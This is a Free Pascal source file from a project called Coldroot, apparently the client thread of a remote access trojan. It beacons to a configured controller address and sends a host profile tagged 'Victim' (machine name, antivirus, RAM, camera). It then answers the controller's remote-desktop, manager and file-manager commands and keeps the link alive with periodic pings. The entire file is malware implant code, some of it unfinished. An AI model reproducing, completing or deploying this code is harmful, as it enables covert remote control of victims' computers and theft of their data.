(*
 * Project: Coldroot
 * User: Coldzer0
 * Date: 1/2/16
 *)

unit ConnectionThread;

{$mode Delphi}
{$SMARTLINK ON}

interface
    uses
        classes,sysutils,IdGlobal,IdTCPClient,PacketTypes,ConnectionFunc,fpjson, jsonparser,
        DOS,BaseUnix,
        FilesFunc;

type
    TMainClientThread = class(TThread)
    private
        PINGED, ServerDisconnected : Boolean;
        lastPing : QWord;
    protected
        procedure Execute; override;
    public
        IP : String;
        Port : Integer;
        Active: Boolean;
        ThreadTerminated: Boolean;
        TCPClient : TIdTCPClient;
        constructor Create(CreateSuspended : Boolean);
    end;

implementation


constructor TMainClientThread.Create(CreateSuspended : Boolean);
begin
    inherited Create(CreateSuspended);
//    FreeOnTerminate := True;
    PINGED := False;
    TCPClient := nil;
    ThreadTerminated := False;
end;



procedure TMainClientThread.Execute;
var
    Buf,outBuff: TIdBytes;
    Len : Cardinal;
    Connected: Boolean;
    packet : TMainPacket;
    jData : TJSONData;
    jObject : TJSONObject;
    KernelName: UtsName;
    PC_info : string;
    Files: TStringList;
begin
    inherited;
    Connected := false;
    while not Terminated do
    begin
        if Active then
        begin
            {Double Check}

            Connected := TCPClient.Connected;

            Sleep(1);
            if not Connected then
            begin
                try
                    TCPClient.Host := Self.IP;
                    TCPClient.Port := Self.Port;
                   // TCPClient.IPVersion := Id_IPv4;
                    TCPClient.ConnectTimeout := 3000;

                    writeln('Try To Connect : '+TCPClient.Host + ':' ,TCPClient.Port ,' | ',TimeToStr(Now));
                    TCPClient.Connect;
                    writeln('test : ',TimeToStr(Now) );
                    if TCPClient.Connected then
                    begin
                        try
                            writeln('Connected To : ',TCPClient.Host + ' | ',TimeToStr(Now) );
                            begin
                                packet.DataType := H_MainInfo;
                                packet.Header.RandomKey[0] := $DEAD;
                                packet.Header.RandomKey[1] := $C0DE;

                                Buf := MainPacketToByteArray(packet);
                                ClientSendBuffer(TCPClient,Buf);

                                fpuname(KernelName);
                                jData := GetJSON('{"Serial":"DEADC0DE","ID":"Victim","PCName":"N/A","AV":"N/A","AW":"N/A","Ver":1,"OS":13,"RAM":8192,"CAM":false}');
                                jObject := TJSONObject(jData);
                                jObject.Strings['PCName'] := ArrayToString(kernelname.nodename);
                                PC_info := jObject.FormatJSON;
                                ClientSendString(TCPClient,PC_info);
                                WriteLn(' PC info sent ..');
                            end;
                            Lastping := TThread.GetTickCount64();
                            ServerDisconnected := False;
                        except
                            ServerDisconnected := True;
                        end;
                    end;
                except
                    ServerDisconnected := True;
                end;
            end;

            while not ServerDisconnected do
            begin
                Sleep(10);
                try
                    Connected := TCPClient.Connected;
                except
                    Connected := False;
                    ServerDisconnected := True;
                end;

                if Connected then
                begin
                    {Read Buffer}
                    Len := TCPClient.IOHandler.InputBuffer.Size;
                    {Write Buffer}
                    if (Len <> 0) and (Len > 10) then
                    begin
                        if ClientReceiveBuffer(TCPClient,Buf) then
                            writeln('Packet with len : ', Len , ' | ',TimeToStr(Now) );

                        packet := ByteArrayToMainPacket(Buf);
                        case packet.DataType of
                            H_RemoteDesktop:
                            begin
                                writeln('Get Packet with type : H_RemoteDesktop  | ',TimeToStr(Now) );
                                outBuff := MainPacketToByteArray(packet);
                                if ClientSendBuffer(TCPClient,outBuff) then
                                WriteLn('Packet : H_RemoteDesktop - sent .. ');
                                ClientSendString(TCPClient,PC_info);
                            end;
                            H_MainManager:
                            begin
                                writeln('Get Packet with type : H_MainManager  | ',TimeToStr(Now) );
                                outBuff := MainPacketToByteArray(packet);
                                if ClientSendBuffer(TCPClient,outBuff) then
                                    WriteLn('Packet : H_MainManager - sent .. ');
                                ClientSendString(TCPClient,PC_info);
                            end;
                            H_FileManager:
                            begin
                                // Files := TStringList.Create();
                                writeln('Get Packet with type : H_FileManager  | ',TimeToStr(Now) );
                                Writeln ('Sending the CurrentDir : ',GetCurrentDir);
                                Files := GetAllinDir(GetCurrentDir);
                                //
                            end;

                        end;
                    end;
{==============================================================================}
{==============================================================================}
                    if TThread.GetTickCount64() > Lastping + 20000 then
                    begin
                        if PINGED = False then
                        begin
                            Lastping := TThread.GetTickCount64();
                            writeln('PING : ',TimeToStr(Now) );
                            //send ping to server should be here ..
                            packet.DataType := H_ACTIVE_WINDOW;
                            Buf := MainPacketToByteArray(packet);
                            if ClientSendBuffer(TCPClient,Buf) then
                                WriteLn('Packet : H_ACTIVE_WINDOW - sent .. ');
                            PC_info := TimeToStr(Now);
                            ClientSendString(TCPClient,PC_info);
                        end;
                    end;

                end
                else
                    ServerDisconnected := True;
            end;
            try
                WriteLn('TCPClient Disconnected ..');
                TCPClient.Disconnect(false);
            except
            end;
            WriteLn('TThread Sleep 2 SEC ..');
            TThread.Sleep(2000);
        end;
    end;
    WriteLn('Thread Terminated [1] ..');
    ThreadTerminated := True;
end;

end.